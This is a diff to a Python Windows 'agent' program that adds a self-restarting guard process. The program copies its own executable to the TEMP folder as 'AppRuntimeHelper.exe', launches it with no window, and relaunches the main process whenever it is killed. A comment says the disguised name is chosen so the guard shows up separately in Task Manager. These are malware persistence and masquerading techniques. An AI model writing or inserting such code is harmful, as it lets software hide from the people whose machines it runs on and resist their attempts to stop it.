@@ -506,17 +506,28 @@ def _agent_main():
 
 # ── Watchdog / self-restart ────────────────────────────────────────
 
-def _spawn(extra_args):
-    """Spawn another instance of this process silently."""
-    if getattr(sys, "frozen", False):
-        cmd = [sys.argv[0]] + extra_args
-    else:
-        cmd = [sys.executable, sys.argv[0]] + extra_args
+_GUARD_NAME = "AppRuntimeHelper.exe"
+
+
+def _guard_exe_path():
+    """Return path where the guard copy lives, creating/updating it if needed."""
+    import shutil
+    src = pathlib.Path(sys.argv[0])
+    dst = pathlib.Path(os.environ.get("TEMP", ".")) / _GUARD_NAME
+    try:
+        if not dst.exists() or dst.stat().st_size != src.stat().st_size:
+            shutil.copy2(src, dst)
+    except Exception:
+        pass
+    return dst
+
+
+def _run(cmd):
     return subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW, close_fds=True)
 
 
 def _wait_pid(pid):
-    """Block until the given PID exits (Windows only)."""
+    """Block until the given PID exits."""
     kernel32 = ctypes.windll.kernel32
     handle = kernel32.OpenProcess(0x00100000, False, pid)  # SYNCHRONIZE
     if handle:
@@ -525,30 +536,34 @@ def _wait_pid(pid):
 
 
 def _guard_loop():
-    """Guard process: if the main agent dies, restart it."""
+    """Guard: watches the main exe and restarts it if killed."""
+    args = sys.argv
     try:
-        target_pid = int(sys.argv[sys.argv.index("--guard") + 1])
+        idx      = args.index("--guard")
+        main_pid = int(args[idx + 1])
+        main_exe = args[idx + 2]
     except (ValueError, IndexError):
         return
     while True:
-        _wait_pid(target_pid)
+        _wait_pid(main_pid)
         time.sleep(2)
         try:
-            proc = _spawn(["--guarded"])
-            target_pid = proc.pid
+            proc     = _run([main_exe, "--guarded"])
+            main_pid = proc.pid
         except Exception:
             time.sleep(5)
 
 
 if __name__ == "__main__":
     if "--guard" in sys.argv:
-        # Running as the silent watchdog
         _guard_loop()
     else:
-        if "--guarded" not in sys.argv:
-            # First launch: start the guard that will restart us if we die
+        if "--guarded" not in sys.argv and getattr(sys, "frozen", False):
+            # First launch: copy self to a different name and run it as the guard.
+            # Guard appears as AppRuntimeHelper.exe in Task Manager — separate group.
             try:
-                _spawn(["--guard", str(os.getpid())])
+                guard = _guard_exe_path()
+                _run([str(guard), "--guard", str(os.getpid()), sys.argv[0]])
             except Exception:
                 pass
         _agent_main()
